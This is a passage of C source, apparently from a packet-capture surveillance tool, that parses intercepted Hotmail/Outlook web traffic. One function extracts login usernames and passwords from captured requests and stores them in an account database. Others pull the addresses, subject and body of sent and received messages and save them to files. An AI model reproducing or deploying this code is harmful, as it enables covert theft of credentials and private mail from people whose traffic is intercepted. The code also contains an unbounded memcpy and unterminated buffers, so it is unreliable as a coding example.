            return -1;
        
        p1 = strstr(tmp_data, "loginfmt=");
        if(!p1)
            return -1;

        p1 += strlen("loginfmt=");
        p2 = strchr(p1, '&');
        if(!p2)
            return -1;

        memcpy(tmp_name, p1, (p2 - p1) > MAX_UN_LEN ? MAX_UN_LEN : (p2 - p1));
        htmldecode_full(tmp_name, mail_info->username);
        if(!strstr(mail_info->username, "@outlook.com"))
        {
            strcat(mail_info->username, "@outlook.com");
        }

        p1 = strstr(tmp_data, "passwd=");
        if(!p1)
            return -1;

        p1 += strlen("passwd=");
        p2 = strchr(p1, '&');
        if(!p2)
            return -1;

        memcpy(tmp_password, p1, (p2 - p1) > MAX_UN_LEN ? MAX_UN_LEN : (p2 - p1));
        htmldecode_full(tmp_password, mail_info->passwd);
        store_account_db(mail_info);
        return -1;
    }   
	return 0;
}

int analyse_hotmail_send(Mail_info *mail_info,char *data,unsigned int datalen, int is_b_s)
{
    if(is_b_s && (1 == http_recive_mail(mail_info, data, datalen)))
    {
        char* p1 = NULL, *p2 = NULL;
        char tmp_subject[MAX_SUBJ_LEN] = {0};
        
		p1 = strstr(mail_info->body, "txtto=");
        if(!p1)
            return -1;
        
		p1 += strlen("txtto=");
        p2 = strchr(p1, '&');
        if(!p2)
            return -1;
    
	    memcpy(mail_info->to, p1, p2-p1);

        //如果from为空,后面入库程序无法入webmail表
		strcpy(mail_info->from, "unknown");
		p1 = strstr(mail_info->body, "txtsbj=");
        if(!p1)
            return -1;
        
		p1 += strlen("txtsbj=");
		
	    p2 = strchr(p1, '&');
        if(!p2)
            return -1;
		if(p2)
		{
			memcpy(tmp_subject, p1, p2-p1 > MAX_SUBJ_LEN ? MAX_SUBJ_LEN: (p2-p1));
		}

        htmldecode_full(tmp_subject, mail_info->subject);
        p1 = strstr(mail_info->body, "txtcc=");
        
        if(p1)
        {
            p1 += strlen("txtcc=");
            p2 = strchr(p1, '&');
            if(p2)
            {
                memcpy(mail_info->cc, p1, p2-p1 > MAX_CC_LEN ? MAX_CC_LEN: (p2-p1));
            }
        }
    		
        p1 = strstr(mail_info->body, "txtbcc=");
        
        if(p1)
        {
            p1 += strlen("txtbcc=");
            p2 = strchr(p1, '&');
            if(p2)
            {
                memcpy(mail_info->bcc, p1, p2-p1 > MAX_BCC_LEN ? MAX_BCC_LEN: (p2-p1));
            }
        }

    	p1 = strstr(mail_info->body, "txtbdy=");
    	if(p1)
    	{
    	    char* tmp_content = NULL, *content_bak = NULL;
    		p1 += strlen("txtbdy=");
    		p2 = strchr(p1, '&');
    		if(p2)
            {
                mail_info->content = (char*)malloc(p2 - p1);
                tmp_content = (char*)malloc(p2 - p1);
                if(!mail_info->content || !tmp_content)
                    return -1;
                    
                memcpy(tmp_content, p1, p2 - p1);
                htmldecode_full(tmp_content, mail_info->content);
                free(tmp_content);
                
                content_bak = conv_to_xml_symbol(mail_info->content);
                free(mail_info->content);
                mail_info->content = clear_html_tag(content_bak);
                free(content_bak);
                create_dir(mail_info->save_path, "hot", "outlook");
                write_to_file(mail_info);
            }
			
	    }    

        return -1;
    }

    return 0;
}

int analyse_hotmail_recvmail(Mail_info *mail_info,char *data,unsigned int datalen, int is_b_s)
{
    if(!is_b_s && (1 == http_recive_mail(mail_info, data, datalen)))
    {
        char* p1 = NULL, *p2 = NULL, *p3 = NULL, *p4 = NULL;
        char* tmp_content = NULL, *content_bak = NULL;
        
        p1 = strstr(mail_info->body, "class=\"frm\"");
        if(!p1)
            return -1;

        p1 += strlen("class=\"frm\"");
        p2 = strstr(p1, "</td>");
        if(!p2)
            return -1;

        if((p3 = strchr(p1, '[')) != NULL && (p3 > p1) && (p3 < p2))
        {
            p3 += 1;
            p4 = strchr(p3, ']');
            if(p4 && (p4 < p2))
            {
                memcpy(mail_info->from, p3, (p4 - p3) > MAX_FROM_LEN ? MAX_FROM_LEN : (p4 - p3));
            }else
            {
                return -1;
            }
        }else
        {
            return -1;
        }

        p1 = strstr(mail_info->body, "id=\"divTo\"");
        if(!p1)
            return -1;

        p1 += strlen("id=\"divTo\"");
        p2 = strstr(p1, "</div>");
        if(!p2)
            return -1;

        if((p3 = strchr(p1, '[')) != NULL && (p3 > p1) && (p3 < p2))
        {
            p3 += 1;
            p4 = strchr(p3, ']');
            if(p4 && (p4 < p2))
            {
                memcpy(mail_info->to, p3, (p4 - p3) > MAX_TO_LEN ? MAX_TO_LEN : (p4 - p3));
            }else
            {
                return -1;
            }
        }else
        {
            return -1;
        }

        p1 = strstr(mail_info->body, "id=\"divCc\"");
        if(p1)
        {
            p1 += strlen("id=\"divCc\"");
            p2 = strstr(p1, "</div>");
            if(p2)
            {
                p3 = strchr(p1, '[');
                if(p3)
                {
                    p3 += 1;
                    p4 = strchr(p3, ']');
                    if(p4)
                    {
                        memcpy(mail_info->cc, p3, (p4 - p3) > MAX_CC_LEN ? MAX_CC_LEN : (p4 - p3));
                    }
                }
            }
        }

        p1 = strstr(mail_info->body, "<td class=\"bdy\">");
        if(!p1)
            return -1;

        p1 += strlen("<td class=\"bdy\">");
        p2 = strstr(p1, "</td>");
        if(!p2)
            return -1;

        p3 = strstr(p1, "<div>");
        if(!p3 && (p3 < p2))
            return -1;

        p3 += strlen("<div>");
        
        tmp_content = (char*)malloc(p2 - p3);
        content_bak = (char*)malloc(p2 - p3);
        if(!tmp_content || !content_bak)
            return -1;

        bzero(tmp_content, p2 - p3);
        bzero(content_bak, p2 - p3);
        memcpy(tmp_content, p3, p2 - p3);
        htmldecode_full(tmp_content, content_bak);
        free(tmp_content);
        tmp_content = clear_html_symbol(content_bak);
        free(content_bak);
        mail_info->content = clear_html_tag(tmp_content);
        free(tmp_content);
        create_dir(mail_info->save_path, "hot", "outlook");
        write_to_file(mail_info);

        return -1;
    }
    
    return 0;
}

int analyse_hotmail(void *node, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s, int m_or_a)
{
	unsigned int type;
	int result = 0;
	if (!m_or_a) 
	{
		Mail_info *mail_info = (Mail_info *)node;
		type = mail_info->mail_type & 0x00FF;
		switch (type) 
		{
			case 0x01:
				result = analyse_hotmail_psword(mail_info, data, data_len, ptcp, is_to_s);
				//analyse_data(mail_info,data,data_len,ptcp,is_to_s,hotmail_passwd_isend, NULL, 0);
				break;
			case 0x11:
				//result = analyse_hotmail_mail(mail_info, data, data_len, ptcp, is_to_s);
				result = analyse_data(mail_info,data,data_len,ptcp,is_to_s,hotmail_send_isend, write_hotmail_send, 1);
				break;
            case 0x012:
                result = analyse_hotmail_send(mail_info, data, data_len, is_to_s);
                break;
			case 0x21:
				result = analyse_hotmail_rcvmail(mail_info, data, data_len, ptcp, is_to_s);
				break;
            case 0x22:
                result = analyse_hotmail_recvmail(mail_info, data, data_len, is_to_s);
                break;
			case 0x41:
				result = analyse_hotmail_delete(mail_info, data, data_len, ptcp, is_to_s);
				break;
		}

		if(result == -1)
		{
			delete_mail_info(mail_info);
		}
	} 
	else 
	{
		Attach_info *attach_info = (Attach_info *)node;
		type = attach_info->attach_type & 0x00FF;
		switch (type) 
		{
		case 0x61:
			////printf("analyse_hotmail_attach_1\n");
			result = analyse_hotmail_attach_1(attach_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x62:
			////printf("analyse_hotmail_attach_2\n");
			result = analyse_hotmail_attach_2(attach_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x63:
			////printf("analyse_hotmail_attach_3\n");
			result = analyse_hotmail_attach_3(attach_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x64:
			result = analyse_hotmail_down_attach(attach_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x65:
			result = analyse_hotmail_attach_4(attach_info, data, data_len, ptcp, is_to_s);
			break;
		}
		if (result == -1) 
		{
			////printf("delete attach node ...\n");
			del_attach_node(attach_info);
			delete_attach(attach_info);
		}
	}
}

